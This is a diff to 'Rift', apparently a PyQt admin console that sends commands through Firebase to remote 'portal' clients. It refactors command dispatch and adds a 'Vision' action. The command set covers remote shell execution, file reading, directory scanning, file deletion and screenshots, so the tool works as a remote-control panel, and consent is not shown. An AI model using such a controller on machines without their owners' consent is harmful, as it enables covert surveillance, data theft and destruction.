@@ -1295,9 +1295,11 @@ class FirebaseWorker(_QObj):
             status = info.get("status", "unknown")
             opened_at = info.get("opened_at", "")
             last_seen = info.get("last_seen", "")
-            # Treat anything not explicitly "open" as inactive
+            # Treat anything not explicitly "open" as inactive, but keep the
+            # original status (e.g. "user-closed", "closed") so the admin UI can
+            # show the close alert and zip-download option.
             is_open = (status == "open")
-            session_status = "active" if is_open else "inactive"
+            session_status = "active" if is_open else status
             # Determine card state:
             #   stale = open but no heartbeat recently
             #   waiting = open but admin hasn't opened portal yet
@@ -1572,6 +1574,7 @@ STATE_INFO = {
     "test_pulse": ("PULSE",      "#dc1e28"),
     "paused":     ("PAUSED",     "#ffb432"),
     "feedme":     ("FEEDME",     "#28dc64"),
+    "vision":     ("VISION",     "#dc50b4"),
 }
 
 
@@ -3064,6 +3067,7 @@ class SessionDetailView(QWidget):
         ".fetchall": "command",
         ".reset": "idle",
         ".pulse": "test_pulse",
+        ".vision": "vision",
     }
 
     def __init__(self, parent=None):
@@ -3199,7 +3203,7 @@ class SessionDetailView(QWidget):
         left_layout.setContentsMargins(14, 14, 14, 14)
         left_layout.setSpacing(10)
 
-        # Quick actions — only Screenshot, Feed, Pause, Reset
+        # Quick actions — Screenshot, Feed, Pause, Pulse, Vision
         actions_label = QLabel("QUICK ACTIONS")
         actions_label.setFont(QFont(ADMIN_MONO, 7, QFont.Weight.Bold))
         actions_label.setStyleSheet(f"color: {ADMIN_HUD_DIM}; background: transparent; border: none; letter-spacing: 2px;")
@@ -3211,12 +3215,12 @@ class SessionDetailView(QWidget):
         self.btn_feed = ControlButton("Feed", "40,220,100")
         self.btn_pause = ControlButton("Pause", "255,180,50")
         self.btn_pulse = ControlButton("Pulse", "220,30,40")
-        self.btn_idle = ControlButton("Reset", "139,139,154")
+        self.btn_vision = ControlButton("Vision", "220,80,180")
         actions_row.addWidget(self.btn_screenshot)
         actions_row.addWidget(self.btn_feed)
         actions_row.addWidget(self.btn_pause)
         actions_row.addWidget(self.btn_pulse)
-        actions_row.addWidget(self.btn_idle)
+        actions_row.addWidget(self.btn_vision)
         left_layout.addLayout(actions_row)
 
         # Command input
@@ -3355,7 +3359,7 @@ class SessionDetailView(QWidget):
         self.btn_feed.clicked.connect(lambda: self._quick("feedme"))
         self.btn_pause.clicked.connect(lambda: self._quick("paused"))
         self.btn_pulse.clicked.connect(lambda: self._quick("test_pulse"))
-        self.btn_idle.clicked.connect(lambda: self._quick("idle"))
+        self.btn_vision.clicked.connect(lambda: self._quick("vision"))
 
     def _on_admin_animation_done_in_detail(self):
         """Local animation reached full size — nothing to do here, handled by widget."""
@@ -3433,18 +3437,9 @@ class SessionDetailView(QWidget):
             self.add_result("output", "Available Commands", "\n".join(sorted(self.COMMAND_MAP.keys())) + "\n.help")
             return
 
-        # Map command to orb state for visual feedback (use just the command word,
-        # so commands with arguments like ".scan C:\\path" still map correctly).
-        cmd_word = text.split(None, 1)[0].lower()
-        orb_state = self.COMMAND_MAP.get(cmd_word, "command")
-        self.quick_action.emit(self._session.id, orb_state)
-
-        # Send the raw .rift command to the portal so it can interpret it
-        # The portal handles .rift commands directly
-        send_command_to_session(self._session.id, "rift_command", command=text)
-
-        # Add to results
-        self.add_result("output", f"$ {text}", f"Command sent: {text}\nWaiting for response...")
+        # Hand the command to the admin console so it sends a single rift_command
+        # (and updates local orb state) without duplicating typed/rift commands.
+        self.command_sent.emit(self._session.id, text)
 
     def _send_chat(self):
         text = self._chat_input.text().strip()
@@ -5119,13 +5114,18 @@ class RiftAdminConsole(QWidget):
         """Close/end a session — sends force_close and returns to list."""
         if self._current_session and not self._confirm_close_session():
             return
-        # Send force_close command to the portal
+        # Send force_close command to the portal and mark the session as closed
+        # in Firebase so the admin UI immediately shows the close alert.
         send_command_to_session(session_id, "force_close")
+        try:
+            _firebase_put(f"sessions/{session_id}/status", "closed")
+        except Exception:
+            pass
         # Stop watching results
         self._firebase_worker.unwatch_results(session_id)
         for s in self._sessions:
             if s.id == session_id:
-                s.status = "inactive"
+                s.status = "closed"
                 s.portal_connected = False
                 break
         self._current_session = None
@@ -5171,105 +5171,83 @@ class RiftAdminConsole(QWidget):
         self._session_list.set_sessions(self._sessions)
 
     def _on_command_sent(self, session_id, text):
-        """Send a typed command to the portal client via Firebase."""
-        # Parse . commands
+        """Send a typed command to the portal client via Firebase.
+
+        All commands starting with '.' are sent as a single rift_command so the
+        portal interprets them directly. This avoids sending both a rift_command
+        and a separate typed command (which produced "command errors" even though
+        the action succeeded)."
+        """
         text = text.strip()
         if not text:
             return
 
-        cmd_map = {
-            ".scan": ("scan", {}),
-            ".screenshot": ("screenshot", {}),
-            ".pause": ("pause_portal", {}),
-            ".feed": ("feedme", {}),
-            ".reset": ("resume_portal", {}),
-            ".pulse": ("test_pulse", {}),
-            ".terminal": ("terminal", {}),
-            ".view": ("scan_directory", {}),
-            ".fetch": ("read_file", {}),
-            ".fetchall": ("scan_directory", {}),
-            ".delete": ("delete_file", {}),
-        }
-
-        parts = text.split(None, 1)
-        cmd_key = parts[0].lower()
-        arg = parts[1] if len(parts) > 1 else ""
-
-        if cmd_key == ".help":
+        cmd_word = text.split(None, 1)[0].lower()
+        if cmd_word == ".help":
             return
 
-        # Determine command type and extra params
-        if cmd_key in cmd_map:
-            cmd_type, _ = cmd_map[cmd_key]
-            extra = {}
-            if cmd_type == "scan" and arg:
-                extra["path"] = arg
-            elif cmd_type == "scan_directory" and arg:
-                extra["path"] = arg
-            elif cmd_type == "read_file" and arg:
-                extra["path"] = arg
-            elif cmd_type == "delete_file" and arg:
-                extra["path"] = arg
-            elif cmd_type == "terminal" and arg:
-                extra["command"] = arg
-        else:
-            # Unknown command — send as message
-            cmd_type = "message"
-            extra = {"text": text}
-
-        # Send via Firebase
-        cmd_id = send_command_to_session(session_id, cmd_type, **extra)
-
-        # Trigger orb
+        # Determine orb state for local visual feedback
         orb_state_map = {
-            "screenshot": "screenshot",
-            "pause_portal": "paused",
-            "feedme": "feedme",
-            "resume_portal": "idle",
-            "test_pulse": "test_pulse",
-            "terminal": "terminal",
-            "scan": "command",
-            "scan_directory": "command",
-            "read_file": "command",
-            "delete_file": "command",
-            "message": "command",
+            ".scan": "command",
+            ".view": "command",
+            ".fetch": "command",
+            ".fetchall": "command",
+            ".delete": "command",
+            ".terminal": "terminal",
+            ".screenshot": "screenshot",
+            ".pause": "paused",
+            ".feed": "feedme",
+            ".pulse": "test_pulse",
+            ".reset": "idle",
+            ".vision": "vision",
         }
-        orb_state = orb_state_map.get(cmd_type, "command")
+
+        if cmd_word.startswith("."):
+            # Send the raw .rift command to the portal interpreter
+            send_command_to_session(session_id, "rift_command", command=text)
+            orb_state = orb_state_map.get(cmd_word, "command")
+        else:
+            # Plain text — send as a message command
+            send_command_to_session(session_id, "message", text=text)
+            orb_state = "command"
+
         self._trigger_orb(orb_state)
 
         if self._current_session and self._current_session.id == session_id:
-            self._session_detail.add_result("output", f"$ {text}", f"Command sent to portal...\nType: {cmd_type}\nID: {cmd_id}")
+            self._session_detail.update_state(orb_state)
+            self._session_detail.add_result("output", f"$ {text}", "Command sent to portal...\nWaiting for response...")
 
     def _on_quick_action(self, session_id, action):
-        """Send a quick action command to the portal via Firebase."""
-        action_map = {
-            "screenshot": "screenshot",
-            "feedme": "feedme",
-            "paused": "pause_portal",
-            "test_pulse": "test_pulse",
-            "idle": "resume_portal",
-        }
-        cmd_type = action_map.get(action, action)
-        send_command_to_session(session_id, cmd_type)
+        """Send a quick action command to the portal via Firebase.
 
-        # Trigger orb locally
-        orb_state_map = {
-            "screenshot": "screenshot",
-            "feedme": "feedme",
-            "paused": "paused",
-            "test_pulse": "test_pulse",
-            "idle": "idle",
+        Quick action buttons toggle their mode on the second press. Instead of
+        sending a separate typed command and a rift_command, we send a single
+        rift_command (e.g. '.feed') and let the portal toggle the state itself.
+        """
+        # Map the action name to the rift_command text
+        action_cmd_map = {
+            "screenshot": ".screenshot",
+            "feedme": ".feed",
+            "paused": ".pause",
+            "test_pulse": ".pulse",
+            "vision": ".vision",
         }
-        orb_state = orb_state_map.get(action, "command")
-        self._trigger_orb(orb_state)
+        cmd_text = action_cmd_map.get(action, action)
+        send_command_to_session(session_id, "rift_command", command=cmd_text)
 
-        # Update session state
+        # Toggle the local orb state for Feed/Pause/Pulse/Vision; Screenshot is one-shot
+        toggle_actions = {"feedme", "paused", "test_pulse", "vision"}
+        target_state = action
         for s in self._sessions:
             if s.id == session_id:
-                s.orb_state = orb_state
+                if action in toggle_actions and s.orb_state == action:
+                    target_state = "idle"
+                s.orb_state = target_state
                 if self._current_session and self._current_session.id == session_id:
-                    self._session_detail.update_state(orb_state)
+                    self._session_detail.update_state(target_state)
                 break
+
+        self._trigger_orb(target_state)
 
     def _trigger_orb(self, state):
         """Trigger the sidebar orb to flash a state."""
@@ -5284,6 +5262,8 @@ class RiftAdminConsole(QWidget):
         elif state == "terminal":
             self.orb.flash_terminal()
         elif state == "command":
+            self.orb.flash_command()
+        elif state == "vision":
             self.orb.flash_command()
         elif state == "idle":
             self.orb.set_state("idle")
